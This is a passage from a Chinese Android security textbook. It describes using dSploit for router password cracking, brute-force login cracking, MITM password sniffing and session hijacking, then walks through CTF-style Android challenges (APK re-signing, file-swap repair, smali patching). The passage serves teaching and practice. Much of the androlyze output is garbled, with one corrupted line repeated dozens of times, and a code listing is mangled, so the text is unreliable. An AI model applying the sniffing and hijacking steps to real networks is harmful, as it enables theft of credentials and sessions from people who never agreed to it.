<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>dSploit</td><td style='text-align: center; word-wrap: break-word;'>zAnti</td><td style='text-align: center; word-wrap: break-word;'>Droid Sheep</td><td style='text-align: center; word-wrap: break-word;'>NetSpoof</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>扫描Wi-Fi、破解路由器密码</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>支持深入检测</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>漏洞搜索</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>Partial</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>破解多协议登录</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>修改正在运行的支持局域网的数据包</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>支持HTTPS/SSL（包含SSL Stripping和强制移动功能）</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MITM实时网络状态信息</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MITM多协议密码嗅探</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MITM HTTP/HTTPS会话截取</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>Partial</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>维持被截取的MITM HTTP/HTTPS会话文件</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>No</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MITM HTTP/HTTPS实时操作</td><td style='text-align: center; word-wrap: break-word;'>Yes</td><td style='text-align: center; word-wrap: break-word;'>Partial</td><td style='text-align: center; word-wrap: break-word;'>No</td><td style='text-align: center; word-wrap: break-word;'>Partial</td></tr></table>

可支持如下模型：

Thomson、DLink、Pirelli Discus、Eircom、Verizon FiOS、Alice AGPF、FASTWEB Pirelli and Telsey、Huawei、Sky V1、Clubinternet.box v1 and v2、InfostradaWifi。

下表是dSploit的主要功能及说明。

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>功能</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RouterPWN</td><td style='text-align: center; word-wrap: break-word;'>使用http://routerpwn.com/服务进行路由器渗透测试</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Trace</td><td style='text-align: center; word-wrap: break-word;'>对指定对象进行Traceroute</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Port Scanner</td><td style='text-align: center; word-wrap: break-word;'>使用Syn端口扫描功能扫描指定对象的开放端口</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Vulnerability Finder</td><td style='text-align: center; word-wrap: break-word;'>使用National Vulnerability Database找出对象的已知漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MITM</td><td style='text-align: center; word-wrap: break-word;'>通过网络嗅探截取网络数据包信息</td></tr></table>

使用dSploit需满足如下条件：

☐ 至少为Android 2.3以上版本；

☐ 已获取Android设备的Root权限；

☐ 需要安装BusyBox。可以从Google Play Store下载安装（获取Root权限时会安装Busybox，但此时安装的Busybox只能执行一部分命令。为了使用dSploit，必须安装可以使用所有命令的完整版BusyBox）。

可以从http://update.dsploit.net/apk下载dSploit。

下载并安装程序，运行dSploit时会要求Root权限，如图6-31所示。

 </div>

在3G环境下运行dSploit时，会显示如图6-32所示的信息。dSploit只能在Wi-Fi环境下使用，3G或LTE环境下是无法运行的。

 </div>

正常运行dSploit并获取Root权限后，显示软件主界面，如图6-33所示。

 </div>

①当前网络的子网掩码信息

② 当前连接的无线路由器SSID/IP/MAC地址信息

③ 使用dSploit的设备信息

④除使用dSploit设备外的其他设备连接信息

使用dSploit对连接中的MSDN-SPECIAL进行测试。选择MSDN-SPECIAL后可以看到能够进行网络漏洞诊断的功能列表，如图6-34所示。

 </div>

下面简单测试几种功能。

#### 6.5.1 端口扫描

选择Port Scanner后可以看到Start按钮，如图6-35所示。点击Start时，会使用Syn模式扫描端口并显示开放的端口号。

 </div>

#### 6.5.2 获取信息

运行Inspector功能会收集诊断对象的设备类型、OS信息、正在使用的服务信息，如图6-36所示。

 </div>

Port Scan和Inspector使用Nmap收集信息。

#### 6.5.3 破解账号

Login Cracker会在使用Port Scan或Inspector时破解对象系统的FTP或Telnet账号和密码。点击Login Cracker后会看到如图6-37所示设置界面。

 </div>

在设置界面中选择Port Scan或Inspector搜索到的服务。设置密码字符范式、用户名、密码的最大/最小长度后，点击Start就会开始暴力破解（Brute Force）。

 </div>

如果有用户名和密码字典文件，可以通过顶端的user wordlist、password list指定相关文件。

#### 6.5.4 中间人攻击

本节对目标进行中间人攻击（MITM）测试。选择MITM后可以看到中间人攻击中使用的菜单，如图6-39所示。

 </div>

简单浏览几个菜单。首先介绍Password Sniffer菜单，它可以对目标嗅探以获取HTTP、FTP、IMAP、IRC、MSN等账号和密码。

 </div>

接着介绍Session Hijacker菜单。会话劫持攻击方法指的是，攻击者劫持对象会话信息后，不需要认证即可登录网站。选择Session Hijacker并点击Start就会开始“钓鱼诈骗”（Spoofing）。此处不会显示工作过程。对象系统登录网站并得到认证后，就会显示对象IP地址和登录的网站URL，如图6-41所示。

 </div>

点击IP地址会提示是否需要进行Session Hijacking。选择YES就开始会话劫持攻击。

 </div>

   </div>

### 6.6 AFLogical：移动设备取证工具

本节与App诊断基本无关, 将介绍一种移动设备取证时用到的工具。AFLogical $ ^{1} $是由viaforensics（www.viaforensics.com）开发的取证工具。将apk文件安装到移动设备并运行, 就可以使用Excel格式保存手机中的联系人、SMS、MMS等信息。此款工具也包含在Santoku Linux $ ^{2} $的Live CD中。

使用adb install命令将下载的apk文件安装到移动设备。

 </div>

如果能正常识别设备则说明安装正常。apk文件使用了个人信息相关API，所以能看到杀毒软件探测出该程序。

 </div>

运行App后，设备驱动器的Forensic目录中会生成csv文件。文件保存了收集的信息，如图6-45所示。

 </div>

虽然AFLogical可用作取证工具，但与制作恶意代码时的使用规则相同。根据用户的不同使用目的，也能用于制作恶意代码。

### 6.7 小结

本章介绍了诊断服务漏洞时的可用工具，这些工具在分析大量服务和App时能发挥重要作用。分析智能手机App时，会有很多需要使用取证分析方法的部分。除了这些工具，也需要对无数其他工具进行测试，然后选出可以在实际工作中使用的工具。第7章将解答Android黑客大赛试题，复习之前学过的内容。

### 第 7 章

# Android 黑客大赛 App 试题

为了让各位体验国内外黑客大赛解题过程，本章将分析我们自己运营的“安全项目”论坛开发的Android App。大家可以通过解题复习之前学过的所有内容，这对之后参加黑客大赛也有很大帮助。

这些题目已经注册到了与“安全项目”论坛有合作关系的CodeEngn（http://codeengn.com）题库。即使是相同的解题方式，也会得出不同答案。希望各位阅读书中解题过程之前，先自己试着找出解题方法。

### 7.1 Android App 试题 1

#### 7.1.1 试题描述与出题目的

##### 试题描述

“安全项目”会员“廷柱”从论坛上下载了朋友介绍的“HelloWorld”App，但是“HelloWorld”文件的一部分遭到损坏，无法安装。请修改“HelloWorld”程序并安装到手机，运行后读取密钥。http://codeengn.com/challenges/smartapp/01

##### 出题目的

本题是检测分析apk文件时需要的最基本的技术，查看编译后的App中会生成哪些文件。用于评价整个App签名过程中的知识点。

#### 7.1.2 解题

安全项目会员 “廷柱” 使用Ubuntu Linux的压缩软件Archive manager打开从论坛下载的HelloWorld.apk文件时，能看到如图7-1所示的文件列表。

 </div>

分析apk文件的最基本的部分是, 需要知道编译App时通过哪种方式生成哪些文件, 还需要熟悉App签名过程才能进行解答。试题1考的就是这些知识点。

使用压缩软件打开可以正常安装到手机上的apk文件时, 画面如图7-2所示。比较图7-1和图7-2可以发现, 3个文件的文件名不同, 而且图7-2的文件在图7-1中是看不到的。

 </div>

如果各位学过apk文件结构，就能知道Androidmanifest.xml、class.dex、resource.arsc的文件名是错误的。另外，因为看不到META-INF文件夹，所以可以判断出程序没有进行签名，故不能正常安装到手机。

Android开发人员应该都经历过签名过程。包含在Android SDK中的Eclipse的Android Tool菜单会在开发Android程序时用到，其上会有Export Signed Application Package和Export Unsigned Application Package菜单。App开发人员需要生成自己固有的密钥（.keystore），发行程序时需要使

用密钥进行签名，没有签名的程序是不能安装在手机上的。

 </div>

升级时也会使用固有密钥。即使是相同程序，固有密钥不同将不能正常升级。因此，为了解决上面的HelloWorld.apk问题，需要修改为正常文件名并分别生成apk签名时需要的固有密钥，对需要安装的apk文件签名后才能正常安装。

签名时可以使用keytool、jarsigner，而我会介绍使用signapk.jar进行签名的方法。

虽然不知道signapk.jar是由谁开发的，但只要有openssl生成的证书和个人密钥（private key），就能轻松地对App进行签名。

首先要下载signapk.jar文件，可以使用google搜索找到文件。 $ ^{①} $使用signapk.jar前需要私人密钥签名的证书，利用openssl可以轻松生成证书。

在Ubuntu Linux的root权限下运行apt-get即可安装openssl。

namdaehyeon@ubuntu:~/Desktop$ sudo apt-get install openssl
[sudo] password for namdaehyeon:
Reading package lists... Done
Building dependency tree
Reading state information... Done
...

安装openssl后，使用下列命令利用openssl生成RSA 1024位临时认证书。

$ openssl genrsa -out tmpBoan.pem 1024
Generating RSA private key, 1024 bit long modulus
.....++++
.....++++
e is 65537 (0x10001)

生成新的密钥后，保存为tmpRequest.pem文件。

openssl req -new -key tmpBoan.pem -out tmpRequest.pem

该过程需要填写国家、地区、姓名等信息，可随意填写，也可随意设置密码。

You are about to be asked to enter information that will be incorporated into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
Country Name (2 letter code) [AU]:KO
State or Province Name (full name) [Some-State]:BoanPorject
Locality Name (eg, city) []:BoanPorject
Organization Name (eg, company) [Internet Widgits Pty Ltd]:BoanPorject
Organizational Unit Name (eg, section) []:BoanPorject
Common Name (e.g. server FQDN or YOUR name) []:BoanPorject
Email Address []:BoanPorject
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:1111
An optional company name []:BoanPorject

将x509证书的有效期设置为9999天，并保存为boan.pem文件。

openssl x509 -req -days 9999 -in tmpRequest.pem -signkey tmpBoan.pem -out Boan.pem
Signature ok
subject=/C=KO/ST=BoanPorject/L=BoanPorject/O=BoanPorject/OU=BoanPorject/CN=BoanPorject/
emailAddress=BoanPorject
Getting Priv=late key

 </div>

生成文件名为boankey.pk8的私人密钥。

 </div>

运行修改后签名并成功安装到手机上的HelloWorld.apk程序，查看认证密钥，如图7-6所示。

 </div>

HelloWorld.apk试题要求解题者具备App分析中最基本的文件结构、文件名、签名、安装等全部知识。

我们制作并解答该试题时出现了几个疑问，希望各位也思考一下。

疑问1：如果是不能安装的apk文件，该如何查看App的权限等信息呢？

Android App程序内部的AndroidManifest.xml文件包括了程序版本、运行环境和程序可以执行的权限等信息。

如果想从AndroidManifest.xml文件中查看App的权限，需要一个转换过程，此时使用的jar文件就是AXMLPrinter2.jar。

可以从下列地址下载AXMLPrinter2.jar。

https://code.google.com/p/android4me/

使用java-jar命令运行AXMLPrinter2.jar程序，并把需要转换的AndroidManifest.xml文件作为参数值输入。

$ java -jar AXMLPrinter2.jar AndroidManifest.xml

上述命令的执行结果如下，可以看到apk版本、软件包名称及需要的SDK版本信息、开发时使用的SDK，也记录了App权限等信息。

<?xml version="1.0" encoding="utf-8"?>
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
package="com.example.helloworld"
>
<uses-sdk
    android:minSdkVersion="8"
    android:targetSdkVersion="17"
>
</uses-sdk>
<application
    android:theme="@7F060001"
    android:label="@7F050000"
    android:icon="@7F020000"
    android:allowBackup="true"
>
<activity
    android:label="@7F050000"
    android:name="com.example.helloworld.MainActivity" >
    <intent-filter>
        <action
            android:name="android.intent.action.MAIN" >
            </action>
            <category
                android:name="android.intent.category.LAUNCHER" >
            </category>
        </intent-filter>
    </activity>
</application>
</manifest>

疑问2：是否可以不安装程序而直接分析classes.dex文件以获取密钥？

将HelloWorld.apk修改为正常文件名后，使用AndroGuard浏览器代码时能看到如下信息。但使用SEED进行了加密，所以不能直接读取密钥。

 </div>

疑问3：是否可以只分析class.dex文件？

HelloWorld.apk文件中，相当于可执行文件的dex文件的文件名是class.dex。dex文件在Android App上起到可执行文件的作用，开发App时，如果对编译后的.class文件使用Android dx工具，则可以将.class文件转换为Dalvik可执行格式（.dex）文件。此过程中，Java字节码会转换为Dalvik字节码。

使用AndroGuard调用并分析修改前的HelloWorld.apk文件时，会出现“找不到class.dex文件”的错误（修改前的.dex文件名为class.dex）。如果各位不熟悉AndroGuard，可以重新学习5.11节。

如果只需要分析dex文件，可以使用dex2jar.jar转换class.dex文件，然后使用JD-GUI进行分析。也可以使用AndroGuard分析文件，AndroGuard中有AnalyzeDex分析方法，只需调用dex文件时可以使用如下方法。

In [1]: d, dx=AnalyzeDex('/home/namdaehyeon/Desktop/class.dex')

可以看到, com.example.helloworld软件包的MainActivity方法中的onClick方法的代码。

In [2]: d.CLASS_Lcom_example_helloworld_MainActivity_1.METHOD_onClick.show()

也可以使用如下命令调用或分析。

In [1]: d=DalvikVMFormat(open('/home/namdaehyeon/Desktop/class.dex').read())
In [2]: codes = d.get_codes_item()
In [3]: codes.show()

使用此方法可以看到class.dex文件的执行代码。

可参考如下URL。

☐ http://docs.oracle.com/cd/E19159-01/820-4605/ablrb/index.html（与生成证书相关）

☐ http://en.wikipedia.org/wiki/APK_(file_format)（定义相关说明）

http://wing-linux.sourceforge.net/guide/developing/tools/othertools.html

http://m.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=20640&curPage=1

### 7.2 Android App 试题 2

#### 7.2.1 试题描述与出题目的

##### 试题描述

“安全项目”会员“廷柱”从论坛上下载了朋友推荐的App“FindKey1.apk”。请查找此程序的密钥。

http://codeengn.com/challenges/smartapp/02

##### 出题目的

第二个Andr = 0id App试题用于测试解题人员对dex文件头信息的理解程度。解题过程非常简单。

#### 7.2.2 解题

使用解压软件打开FindKey1.apk文件后，可以看到如图7-8所示画面。

 </div>

保存权限信息的AndroidManifest.xml、classes.dex、resources.arsc、签名等文件名好像没什么问题。接着安装程序，使用adb复制到移动设备并安装。

$ adb push ~/Desktop/FindKey1.apk /mnt/sdcard/
1076 KB/s (195131 bytes in 0.177s)
移动到Android SD卡后，使用“ASTRO文件管理器”进行安装。

 </div>

程序安装错误。哪里出问题了呢？我们已经满足了解答第一个试题时的两个条件。

(1) 所有文件名正常。

(2) 已签名apk文件。

接着需要考虑 “classes.dex、resources.arsc文件是否被篡改”。使用androlyze查看apk文件的可执行文件classes.dex文件是否正常。

andaehyeon@ubuntu:~/Desktop$ androlyze.py -s

androlyze version 1.7

[1]: a,d,dx=AnalyzeAPK('/home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andaehyeon@ubuntu:~/Desktop$ androlyze.py -s

andaehyeon@ubuntu:~/Desktop$ androlyze.py -s

androlyze.py -s

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/namdaehyeon/Desktop/FindKey1.apk',
  lecompiler="dad")

andrae-get /home/nam

 </div>

可以看到引发错误的部分，提示 “不符合Dalvik格式”。使用Hex编辑器逐个查看文件。

 </div>

分析Windows程序时，各位应该看到过PE头的“MZ”标签，也应该看过表示ELF头起始点的“ELF”标签。classes.dex文件也包含表示dex文件起始点的“dex”标签。

 </div>

从图7-11和图7-12中可以看到，资源文件和classes.dex的文件名相互调换。现在只要把两个文件的文件名还原并查看密钥即可。文件名正常修改后，在classes.dex文件中查看密钥，如图7-13所示。

 </div>

各位可以在解答此题的过程中学到，可执行文件和资源文件能够相互调换。

### 7.3 Android App 试题 3

#### 7.3.1 试题描述与出题目的

##### 试题描述

“安全项目”会员“廷柱”想玩“爬楼梯”游戏。每点击1次按钮就会上1个台阶，到达终点后可看到密钥。请获取此密钥。认证：md5(KEY)

http://codeengn.com/challenges/smartapp/03

 </div>

##### 出题目的

本题检查解题人员能否理解dex文件的Dalvik字节码并进行逆向分析,以及能否通过修改并重新编译文件的过程掌握App伪造技术。

#### 7.3.2 解题

首先修改apk文件以更改返回值，其次修改apk文件并使用Log.v API输出apk需要的值。分析FindKey2.apk文件需要如下3个工具。

(1) androguard

(2) smali-1.4.jar

(3) baksmali-1.4.jar

下面介绍对Android dex文件进行汇编和反汇编的过程。

Androguard可以分析apk文件的所有部分，smali-1.4.jar和baksmali-1.4.jar是为了修补字节代码而对dex文件进行汇编和反汇编的工具。

 </div>

接着分析apk文件。首先在命令行运行androlyze并调用apk文件。

namdaehyeon@ubuntu:~/Desktop$ androlyze.py -s
Androlyze version 1.7
In [1]: a,d,dx=AnalyzeAPK('/home/namdaehyeon/Desktop/FindKey2.apk',
decompiler="dad")
In [2]: d.CLASS_Lcom_example_helloworld_MainActivity_2.source()

调用apk文件后，com.example.helloworld软件包中的MainActivity类源代码如下。

代码7-1

package com.example.helloworld;
class MainActivity$2 implements android.view.View$OnClickListener {
    Integer stairs;
    Integer myStairs;
    final synthetic com.example.helloworld.MainActivity this$0;
    MainActivity$2(com.example.helloworld.MainActivity p3)
}

this.this$0 = p3;
this.stairs = Integer.valueOf(Integer.parseInt(new StringBuilder().append(p3.aView.getText()) .toString()); this.myStairs = Integer.valueOf(Integer.parseInt(new StringBuilder().append(p3.bView.getText()) .toString()); return;
public void onClick(android.view.View p3)
{
    if((this.stairs.intValue() - 1) == this.myStairs.intValue()) {
